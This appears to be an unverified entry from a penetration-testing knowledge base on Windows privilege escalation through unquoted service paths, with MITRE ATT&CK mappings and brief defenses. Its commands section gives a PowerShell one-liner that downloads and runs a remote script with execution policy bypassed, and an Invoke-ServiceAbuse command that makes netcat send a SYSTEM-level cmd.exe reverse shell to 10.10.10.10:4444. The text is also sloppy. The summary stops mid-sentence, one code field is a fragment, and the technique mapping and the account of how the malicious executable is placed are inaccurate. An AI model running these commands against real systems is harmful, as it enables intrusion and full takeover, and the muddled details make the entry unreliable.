---
id: b2e28553-4e42-4f8b-ab66-786d317644d4
name: Windows Privilege Escalation - Unquoted Service Paths
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:29.688574+00:00'
updated_at: '2023-04-10T20:37:34.110238+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[DLL Search Order Hijacking|T1038 - DLL Search Order Hijacking]]'
tags:
- '[[EoP - Unquoted Service Paths]]'
- '[[Windows - Privilege Escalation]]'
commands:
- '[[Check for unquoted service paths]]'
- '[[Exploit vulnerable service]]'
---

# Windows Privilege Escalation - Unquoted Service Paths

## Summary

Unquoted Service Path vulnerability is a common privilege escalation technique used by attackers. This technique occurs when a service is installed without enclosing the path name in quotes, which can lead to the service calling an unintended executable. Attackers can exploit this vulnerability by 

## Description

# Description

Unquoted Service Path vulnerability is a common privilege escalation technique used by attackers. This technique occurs when a service is installed without enclosing the path name in quotes, which can lead to the service calling an unintended executable. Attackers can exploit this vulnerability by creating a malicious executable with the same name as the service, placing it in the same directory, and waiting for the service to execute it. This technique can be used to elevate privileges from a standard user to an administrator. From a technical standpoint, the attacker identifies the unquoted service path, creates a malicious executable, and waits for the service to execute it. From a business perspective, this technique can lead to a complete takeover of the system and potential data loss if the attacker gains access to sensitive information.

 

## Requirements

1. Access to the target system

1. Knowledge of the unquoted service path vulnerability

1. Ability to create a malicious executable

 

## Defense

1. Always use quotes when specifying the path name for a service

1. Regularly scan systems for unquoted service paths

1. Implement the principle of least privilege to minimize the impact of a successful attack

 

## Objectives

1. Gain elevated privileges on the target system

1. Execute arbitrary code on the target system

1. Gain access to sensitive information

 

# Instructions

1. 1. Use PowerUp to identify unquoted service paths.
2. Note the service name and path.
3. Exploit the service by running Invoke-ServiceAbuse with the service name and a command to execute.

 



**Code**: [[# Find the vulnerable application
C:\> powershell.]]



> - The 'Invoke-AllChecks' command in PowerUp will identify unquoted service paths.
- The 'Invoke-ServiceAbuse' command in PowerUp will exploit the unquoted service path vulnerability by setting a new binary path for the affected service.
- The command will then execute the specified command as the LocalSystem account.



**Command** ([[Check for unquoted service paths]]):

```powershell
powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
```





**Command** ([[Exploit vulnerable service]]):

```bash
Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[DLL Search Order Hijacking|T1038 - DLL Search Order Hijacking]]

## Commands Used

- [[Check for unquoted service paths]]
- [[Exploit vulnerable service]]

## Tags

- [[EoP - Unquoted Service Paths]]
- [[Windows - Privilege Escalation]]


